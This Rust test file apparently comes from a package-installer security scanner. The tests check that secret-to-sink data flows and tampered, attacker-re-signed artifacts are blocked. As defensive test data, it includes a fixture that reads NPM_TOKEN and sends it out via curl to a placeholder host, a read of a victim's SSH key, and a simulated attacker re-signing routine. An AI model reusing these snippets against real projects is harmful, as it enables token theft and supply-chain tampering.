            ecosystem: package.ecosystem,
            name: package.name.clone(),
            version: package.version.clone(),
        },
        source_url: package.source_url.clone(),
        source_sha256: "0".repeat(64),
        compiler: "test".to_owned(),
        microcode: module_from_profile(&package, &findings),
        behavior: Behavior::HostCapability,
        verdict: Verdict::Blocked,
        grants: Vec::new(),
        dependencies: Vec::new(),
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        files_scanned: 1,
        capabilities: findings,
        verifier_findings: vec!["denied".to_owned()],
        signature: None,
    };

    let json = serde_json::to_string(&artifact).unwrap();

    assert!(json.contains("\"microcode\""));
    assert!(json.contains("\"op\":\"cap\""));
    let decoded: OmcArtifact = serde_json::from_str(&json).unwrap();
    assert_eq!(decoded.microcode.package, "date-helper");
    assert!(matches!(
        decoded.microcode.functions[0].code[0],
        Op::Cap(CapOp::EnvRead { .. })
    ));
}

// F2 REGRESSION (was a CONFIRMED bypass, now FIXED): `module_from_profile`
// now models a tainted data flow from EVERY sensitive source (env/file read)
// to EVERY sink (network, process, fs write, dynamic eval), so the install
// verdict rejects secret->non-http exfil just as it does secret->http.
// Previously only env->http was wired; env->proc, fs-read->net, env->eval and
// env->fs-write were silently Accepted. A covering flow grant still admits
// the flow (so legitimate, explicitly-authorised tools are not over-blocked).
#[test]
fn redteam_secret_to_every_sink_blocked_at_verdict() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "redteam".to_owned(),
        version: "1.0.0".to_owned(),
        source_url: "https://example.invalid/redteam.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "redteam.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };

    let env = || CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "NPM_TOKEN".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    };
    let fs_read = || CapabilityFinding {
        kind: CapabilityKind::FsRead,
        target: "config.json".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.readFileSync".to_owned(),
    };
    let http = || CapabilityFinding {
        kind: CapabilityKind::HttpRequest,
        target: "evil.example".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fetch(...)".to_owned(),
    };
    let proc = || CapabilityFinding {
        kind: CapabilityKind::ProcSpawn,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "child_process.spawn".to_owned(),
    };
    let fs_write = || CapabilityFinding {
        kind: CapabilityKind::FsWrite,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.writeFileSync".to_owned(),
    };
    let eval = || CapabilityFinding {
        kind: CapabilityKind::DynamicEval,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "eval".to_owned(),
    };

    // A policy that grants every capability used below, but NO flow rules:
    // so the only thing standing between source and sink is the flow check.
    let caps_only = Policy::pure()
        .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
        .allow_capability(Capability::FsRead("config.json".to_owned()))
        .allow_capability(Capability::HttpHost("evil.example".to_owned()))
        .allow_capability(Capability::ProcSpawn("*".to_owned()))
        .allow_capability(Capability::FsWrite("*".to_owned()))
        .allow_capability(Capability::DynamicEval);

    // Every (sensitive source -> sink) pair is now BLOCKED without a flow grant.
    for (label, caps) in [
        ("env -> http", vec![env(), http()]),
        ("fs-read -> http", vec![fs_read(), http()]),
        ("env -> process", vec![env(), proc()]),
        ("env -> fs-write", vec![env(), fs_write()]),
        ("env -> eval", vec![env(), eval()]),
        ("fs-read -> process", vec![fs_read(), proc()]),
    ] {
        assert!(
            verify_module(&module_from_profile(&package, &caps), &caps_only).is_err(),
            "{label} secret exfil must be blocked at verdict time without a flow grant"
        );
    }

    // A covering flow grant (env:NPM_TOKEN -> process) admits the env->proc
    // flow: we must not over-block an explicitly authorised tool.
    let proc_flow = caps_only.clone().allow_flow(
        LabelMatcher::Env("NPM_TOKEN".to_owned()),
        Sink::Process("*".to_owned()),
    );
    assert!(
        verify_module(&module_from_profile(&package, &[env(), proc()]), &proc_flow).is_ok(),
        "env->process must be admitted when a covering flow grant is present"
    );

    // End-to-end witness: a PLAIN env->curl exfil now profiles to BLOCKED even
    // when the victim grants env:NPM_TOKEN + proc.spawn:* (the build-tool caps).
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const t = process.env.NPM_TOKEN;\n\
             const cp = require('child_process');\n\
             cp.spawn('curl', ['-d', t, 'https://canary.invalid/c']);\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "buildtool".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: vec![
            Capability::EnvRead("NPM_TOKEN".to_owned()),
            Capability::ProcSpawn("*".to_owned()),
        ],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Blocked,
        "plain env->curl exfil must now be Blocked without a covering flow grant"
    );
}

// Part 2: the install gate demotes BENIGN runtime capabilities (network, env
// read, file read, dns, time, random) to informational — installing runs none
// of the package's source, so a library's *runtime* API surface must not block
// `omc add`. But the install-/malware-relevant behaviours stay deny-by-default,
// and every secret-source -> sink FLOW still blocks. This pins both halves so a
// future "just allow everything" regression can't slip through.
#[test]
fn install_gate_demotes_benign_caps_but_keeps_worm_vectors_blocked() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "demote-fixture".to_owned(),
        version: "1.0.0".to_owned(),
        source_url: "https://example.invalid/demote-fixture.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "demote-fixture.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let env = || CapabilityFinding {
        kind: CapabilityKind::EnvRead,
        target: "STRIPE_API_KEY".to_owned(),
        source: "index.js".to_owned(),
        evidence: "process.env".to_owned(),
    };
    let http = || CapabilityFinding {
        kind: CapabilityKind::HttpRequest,
        target: "api.stripe.com".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fetch(...)".to_owned(),
    };
    let proc = || CapabilityFinding {
        kind: CapabilityKind::ProcSpawn,
        target: "npm-script:postinstall".to_owned(),
        source: "package.json".to_owned(),
        evidence: "scripts.postinstall".to_owned(),
    };
    let eval = || CapabilityFinding {
        kind: CapabilityKind::DynamicEval,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "eval".to_owned(),
    };
    let fs_write = || CapabilityFinding {
        kind: CapabilityKind::FsWrite,
        target: "*".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.writeFileSync".to_owned(),
    };
    let sensitive_read = || CapabilityFinding {
        kind: CapabilityKind::FsRead,
        target: "/home/victim/.ssh/id_rsa".to_owned(),
        source: "index.js".to_owned(),
        evidence: "fs.readFileSync".to_owned(),
    };

    // The install gate starts from the effective package policy (here just the
    // public defaults) and then demotes benign runtime caps on top.
    let base = allow_benign_runtime_capabilities(
        default_public_capabilities()
            .into_iter()
            .fold(Policy::pure(), Policy::allow_capability),
    );
    let accepts = |caps: &[CapabilityFinding]| {
        verify_module(&module_from_profile(&package, caps), &base).is_ok()
    };

    // ACCEPTED: a lone benign capability is no longer an install-time blocker.
    assert!(
        accepts(&[http()]),
        "a network-only library must install clean (runtime API, not install risk)"
    );
    assert!(
        accepts(&[env()]),
        "an env-reading library with no sink must install clean"
    );

    // BLOCKED: install-/malware-relevant behaviours stay deny-by-default.
    assert!(
        !accepts(&[proc()]),
        "process spawn (incl. npm lifecycle scripts — the Shai-Hulud vector) must stay blocked"
    );
    assert!(
        !accepts(&[eval()]),
        "dynamic eval / unresolved obfuscation must stay blocked"
    );
    assert!(
        !accepts(&[fs_write()]),
        "file writes (persistence/backdoor) must stay blocked"
    );
    assert!(
        !accepts(&[sensitive_read()]),
        "sensitive-file reads must stay blocked even under the demoted fs.read:* grant"
    );

    // BLOCKED: the exfiltration SHAPE (secret read -> network sink) still needs
    // an explicit flow grant, so a real `stripe` install is gated on the flow,
    // not on its individual env/network capabilities.
    assert!(
        !accepts(&[env(), http()]),
        "env -> network exfil flow must stay blocked even though both caps are benign"
    );
}

#[test]
fn signs_and_verifies_artifact_payloads() {
    let dir = tempfile::tempdir().unwrap();
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "signed-pkg".to_owned(),
        version: "1.0.0".to_owned(),
        source_url: "https://example.invalid/signed-pkg.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "signed-pkg.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let mut artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
            ecosystem: package.ecosystem,
            name: package.name.clone(),
            version: package.version.clone(),
        },
        source_url: package.source_url.clone(),
        source_sha256: "0".repeat(64),
        compiler: "test".to_owned(),
        microcode: module_from_profile(&package, &[]),
        behavior: Behavior::Pure,
        verdict: Verdict::Accepted,
        grants: Vec::new(),
        dependencies: Vec::new(),
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        files_scanned: 0,
        capabilities: Vec::new(),
        verifier_findings: Vec::new(),
        signature: None,
    };

    sign_artifact(dir.path(), &mut artifact).unwrap();

    let signature = artifact.signature.as_ref().unwrap();
    assert_eq!(signature.algorithm, "ed25519");
    assert!(dir.path().join(".omc/keys/artifact-ed25519.key").exists());
    verify_artifact_signature(&artifact).unwrap();

    artifact.source_sha256 = "1".repeat(64);
    assert!(matches!(
        verify_artifact_signature(&artifact).unwrap_err(),
        OmcRegistryError::DigestMismatch { .. }
    ));
}

#[test]
fn install_lock_rejects_tampered_artifact_signature() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(
        r#"{
                "name": "pkg",
                "version": "1.0.0"
            }"#,
    );
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);

    let artifact_path = dir.path().join(&package.artifact);
    let mut artifact =
        serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path).unwrap()).unwrap();
    artifact.source_sha256 = "1".repeat(64);
    fs::write(
        &artifact_path,
        serde_json::to_string_pretty(&artifact).unwrap(),
    )
    .unwrap();

    let error = install_lock(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
    )
    .unwrap_err();

    assert!(matches!(error, OmcRegistryError::DigestMismatch { .. }));
}

// RED TEAM TRIPWIRE (CONFIRMED BYPASS): the artifact signature is
// self-attesting. `verify_artifact_signature` reads the public key out of
// the artifact's own `signature.public_key` field and verifies against it.
// There is no trust anchor: nothing checks that this key is the project's
// signing key (.omc/keys/artifact-ed25519.key) or any pinned/known key.
//
// Threat model: the attacker is a malicious dependency author who can
// influence the on-disk .omc/artifacts/*.json + omc.lock that the victim
// runs `omc install --locked` / `ci` against (e.g. a poisoned cache shipped
// in a repo, a compromised mirror, or a malicious transitive dep that wrote
// its own artifact). The attacker does NOT have the victim's signing key.
//
// This test re-signs a TAMPERED artifact (verdict Blocked -> Accepted, a
// dangerous grant + capability stripped, source bytes swapped) with a FRESH
// attacker-generated ed25519 key, then syncs the lock entry to match. Both
// `verify_artifact_signature` AND the full `install_lock` path ACCEPT it.
// If a trust anchor is ever added, this test must start failing (then it
// should be converted to assert rejection).
fn attacker_resign(artifact: &mut OmcArtifact) {
    // Simulate an attacker who does not possess the victim's project key.
    artifact.signature = None;
    let payload = serde_json::to_vec(artifact).unwrap();
    let attacker_key = SigningKey::generate(&mut OsRng);
    let verifying_key = attacker_key.verifying_key();
    let signature = attacker_key.sign(&payload);
    let public_key = verifying_key.to_bytes();
    artifact.signature = Some(ArtifactSignature {
        algorithm: "ed25519".to_owned(),
        key_id: sha256_hex(&public_key)[..16].to_owned(),
        public_key: STANDARD.encode(public_key),
        payload_sha256: sha256_hex(&payload),
        signature: STANDARD.encode(signature.to_bytes()),
    });
}

// F3 REGRESSION (was a CONFIRMED bypass, now FIXED): an attacker who tampers
// a cached artifact (Blocked -> Accepted, dangerous grant stripped) and
// re-signs it with their OWN key is REJECTED by the locked-install path. The
// lock pins the project's signing public key (`signing-key`) and each
// artifact's payload hash (`artifact-sha256`); the forged artifact matches
// neither, so the trust anchor fails closed.
#[test]
fn redteam_attacker_resigned_artifact_is_rejected() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(
        r#"{
                "name": "evil",
                "version": "1.0.0"
            }"#,
    );
    let archive = dir.path().join(".omc/cache/npm/evil.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    // 1) Start from a legitimately-signed lock for a BLOCKED package carrying
    //    a dangerous grant. `signed_lock_for_test` pins the project key and
    //    the genuine artifact payload hash.
    let mut package = locked_package_for_test(Ecosystem::Npm, "evil", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.verdict = Verdict::Blocked;
    package.behavior = Behavior::Pure;
    package.grants = vec!["env.read:*".to_owned()];
    let mut lock = signed_lock_for_test(dir.path(), vec![package.clone()]);

    // 2) ATTACKER tampers the cached artifact: flip the verdict to Accepted
    //    and strip the dangerous grant so the install gate would be satisfied.
    let artifact_path = dir.path().join(&package.artifact);
    let mut artifact =
        serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path).unwrap()).unwrap();
    artifact.verdict = Verdict::Accepted;
    artifact.grants = Vec::new();

    // 3) ATTACKER re-signs with their OWN key (no victim key needed). The
    //    forged signature is still self-consistent...
    attacker_resign(&mut artifact);
    verify_artifact_signature(&artifact)
        .expect("self-consistent forged signature still verifies in isolation");
    fs::write(
        &artifact_path,
        serde_json::to_string_pretty(&artifact).unwrap(),
    )
    .unwrap();

    // 4) ATTACKER syncs the lock entry to match the tampered artifact.
    lock.packages[0].verdict = Verdict::Accepted;
    lock.packages[0].grants = Vec::new();

    // 5) `omc install --locked` now REJECTS it: the artifact's embedded key
    //    is not the pinned project key (and its payload hash no longer
    //    matches the pinned `artifact-sha256`).
    let error = install_lock(dir.path(), &lock)
        .expect_err("attacker-resigned artifact must be rejected by the F3 trust anchor");
    assert!(
        matches!(
            error,
            OmcRegistryError::UnsupportedInstallArtifact(_)
                | OmcRegistryError::DigestMismatch { .. }
        ),
        "expected trust-anchor rejection, got {error:?}"
    );
    assert!(
        !dir.path().join("node_modules/evil").exists(),
        "the tampered package must not be installed"
    );
}

// F3 REGRESSION: a pre-F3 lock with no pinned `signing-key` is treated as
// untrusted on the locked-install path and must be re-locked.
#[test]
fn locked_install_requires_pinned_signing_key() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(r#"{ "name": "pkg", "version": "1.0.0" }"#);
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);

    // Lock omits `signing-key` (pre-F3 / attacker-stripped).
    let lock = OmcLock {
        version: 1,
        signing_key: None,
        packages: vec![package],
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    };
    let error = install_lock(dir.path(), &lock)
        .expect_err("a lock without a pinned signing key must not be trusted");
    assert!(matches!(
        error,
        OmcRegistryError::UnsupportedInstallArtifact(_)
    ));
}

fn npm_tgz_for_test(package_json: &str) -> Vec<u8> {
    let mut bytes = Vec::new();
    {
        let encoder = flate2::write::GzEncoder::new(&mut bytes, flate2::Compression::default());
        let mut archive = tar::Builder::new(encoder);
        let mut metadata_header = tar::Header::new_gnu();
        metadata_header.set_size(0);
        metadata_header.set_mode(0o644);
        metadata_header.set_cksum();
        archive
            .append_data(&mut metadata_header, "._pure-sdist-1.0.0", std::io::empty())
            .unwrap();

        let mut root_header = tar::Header::new_gnu();
        root_header.set_entry_type(tar::EntryType::Directory);
        root_header.set_size(0);
        root_header.set_mode(0o755);
        root_header.set_cksum();
        archive
            .append_data(&mut root_header, "package/", std::io::empty())
            .unwrap();

        let mut header = tar::Header::new_gnu();
        header.set_size(package_json.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive
            .append_data(&mut header, "package/package.json", package_json.as_bytes())
            .unwrap();
        let encoder = archive.into_inner().unwrap();
        encoder.finish().unwrap();
    }
    bytes
}

fn python_sdist_for_test(files: &[(&str, &str)]) -> Vec<u8> {
    let mut bytes = Vec::new();
    {
        let encoder = flate2::write::GzEncoder::new(&mut bytes, flate2::Compression::default());
        let mut archive = tar::Builder::new(encoder);
        let mut root_header = tar::Header::new_gnu();
        root_header.set_entry_type(tar::EntryType::Directory);
        root_header.set_size(0);
        root_header.set_mode(0o755);
        root_header.set_cksum();
        archive
            .append_data(&mut root_header, "pure-sdist-1.0.0/", std::io::empty())
            .unwrap();

        for (path, content) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(content.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive
                .append_data(
                    &mut header,
                    format!("pure-sdist-1.0.0/{path}"),
                    content.as_bytes(),
                )
                .unwrap();
        }

        let encoder = archive.into_inner().unwrap();
        encoder.finish().unwrap();
    }
    bytes
}

fn python_zip_sdist_for_test(files: &[(&str, &str)]) -> Vec<u8> {
    use std::io::Write as _;

    let cursor = Cursor::new(Vec::new());
    let mut archive = zip::ZipWriter::new(cursor);
    let options = zip::write::SimpleFileOptions::default();
    archive.add_directory("pure-sdist-1.0.0/", options).unwrap();
    archive.start_file("._pure-sdist-1.0.0", options).unwrap();
    archive.write_all(b"").unwrap();
    for (path, content) in files {
        archive
            .start_file(format!("pure-sdist-1.0.0/{path}"), options)
            .unwrap();
        archive.write_all(content.as_bytes()).unwrap();
    }
    archive.finish().unwrap().into_inner()
}

fn python_wheel_for_test(metadata: &str) -> Vec<u8> {
    use std::io::Write as _;

    let cursor = Cursor::new(Vec::new());
    let mut archive = zip::ZipWriter::new(cursor);
    let options = zip::write::SimpleFileOptions::default();
    archive
        .start_file("demo_pkg-1.0.0.dist-info/METADATA", options)
        .unwrap();
    archive.write_all(metadata.as_bytes()).unwrap();
    archive.finish().unwrap().into_inner()
}

fn python_package_wheel_for_test(name: &str, version: &str, files: &[(&str, &str)]) -> Vec<u8> {
    python_package_wheel_with_optional_entry_points_for_test(name, version, files, None)
}

fn python_package_wheel_with_entry_points_for_test(
    name: &str,
    version: &str,
    files: &[(&str, &str)],
    entry_points: &str,
) -> Vec<u8> {
    python_package_wheel_with_optional_entry_points_for_test(
        name,
        version,
        files,
        Some(entry_points),
    )
}

fn python_package_wheel_with_optional_entry_points_for_test(
    name: &str,
    version: &str,
    files: &[(&str, &str)],
    entry_points: Option<&str>,
) -> Vec<u8> {
    use std::io::Write as _;

    let cursor = Cursor::new(Vec::new());
    let mut archive = zip::ZipWriter::new(cursor);
    let options = zip::write::SimpleFileOptions::default();
    let mut record_paths = Vec::new();
    for (path, content) in files {
        archive.start_file(path, options).unwrap();
        archive.write_all(content.as_bytes()).unwrap();
        record_paths.push((*path).to_owned());
    }

    let dist_info = format!("{}-{version}.dist-info", python_dist_info_component(name));
    let metadata_path = format!("{dist_info}/METADATA");
    archive.start_file(&metadata_path, options).unwrap();
    archive
        .write_all(format!("Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n").as_bytes())
        .unwrap();
    record_paths.push(metadata_path);

    let wheel_path = format!("{dist_info}/WHEEL");
    archive.start_file(&wheel_path, options).unwrap();
    archive
        .write_all(
            b"Wheel-Version: 1.0\nGenerator: omc-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
        )
        .unwrap();
    record_paths.push(wheel_path);

    if let Some(entry_points) = entry_points {
        let entry_points_path = format!("{dist_info}/entry_points.txt");
        archive.start_file(&entry_points_path, options).unwrap();
        archive.write_all(entry_points.as_bytes()).unwrap();
        record_paths.push(entry_points_path);
    }

    let record_path = format!("{dist_info}/RECORD");
    record_paths.push(record_path.clone());
    record_paths.sort();
    let record = record_paths
        .into_iter()
        .map(|path| format!("{path},,\n"))
        .collect::<String>();
    archive.start_file(&record_path, options).unwrap();
    archive.write_all(record.as_bytes()).unwrap();

    archive.finish().unwrap().into_inner()
}

fn locked_package_for_test(ecosystem: Ecosystem, name: &str, version: &str) -> LockedPackage {
    LockedPackage {
        ecosystem,
        name: name.to_owned(),
        version: version.to_owned(),
        source_url: format!("https://example.invalid/{name}-{version}.tgz"),
        archive: format!(".omc/cache/{name}-{version}.tgz"),
        artifact: format!(".omc/artifacts/{name}-{version}/omc.json"),
        sha256: "0".repeat(64),
        artifact_sha256: String::new(),
        behavior: Behavior::Pure,
        verdict: Verdict::Accepted,
        dependencies: Vec::new(),
        optional_dependencies: Vec::new(),
        peer_dependencies: Vec::new(),
        grants: Vec::new(),
        capabilities: Vec::new(),
        verifier_findings: Vec::new(),
    }
}

/// Sign + write the artifact for `package`, returning the payload sha256
/// (the F3 `artifact-sha256` pin). The project signing key is created on
/// first call; callers pin it into the lock via `project_signing_public_key`
/// or `ensure_lock_signing_key`.
fn write_signed_artifact_for_test(project_dir: &Path, package: &LockedPackage) -> String {
    let resolved = ResolvedPackage {
        ecosystem: package.ecosystem,
        name: package.name.clone(),
        version: package.version.clone(),
        source_url: package.source_url.clone(),
        download_url: None,
        local_path: None,
        filename: Path::new(&package.archive)
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("package.tgz")
            .to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: package.ecosystem == Ecosystem::Npm,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let mut artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
            ecosystem: package.ecosystem,
            name: package.name.clone(),
            version: package.version.clone(),
        },
        source_url: package.source_url.clone(),
        source_sha256: package.sha256.clone(),
        compiler: "test".to_owned(),
        microcode: module_from_profile(&resolved, &package.capabilities),
        behavior: package.behavior,
        verdict: package.verdict,
        grants: package.grants.clone(),
        dependencies: package.dependencies.clone(),
        optional_dependencies: package.optional_dependencies.clone(),
        peer_dependencies: package.peer_dependencies.clone(),
        files_scanned: 0,
        capabilities: package.capabilities.clone(),
        verifier_findings: package.verifier_findings.clone(),
        signature: None,
    };
    sign_artifact(project_dir, &mut artifact).unwrap();
    let artifact_sha256 = artifact_payload_sha256(&artifact).unwrap();

    let artifact_path = checked_join(project_dir, Path::new(&package.artifact)).unwrap();
    fs::create_dir_all(artifact_path.parent().unwrap()).unwrap();
    fs::write(
        &artifact_path,
        serde_json::to_string_pretty(&artifact).unwrap(),
    )
    .unwrap();
    artifact_sha256
}

/// Build a lock for `packages`, signing+writing each artifact, pinning every
/// `artifact-sha256` and the project `signing-key` so it passes the F3 trust
/// anchor on the locked-install path (mirrors what `omc install` produces).
fn signed_lock_for_test(project_dir: &Path, mut packages: Vec<LockedPackage>) -> OmcLock {
    for package in &mut packages {
        package.artifact_sha256 = write_signed_artifact_for_test(project_dir, package);
    }
    OmcLock {
        version: 1,
        signing_key: Some(project_signing_public_key(project_dir).unwrap()),
        packages,
        local_sources: Vec::new(),
        python_vcs: Vec::new(),
    }
}
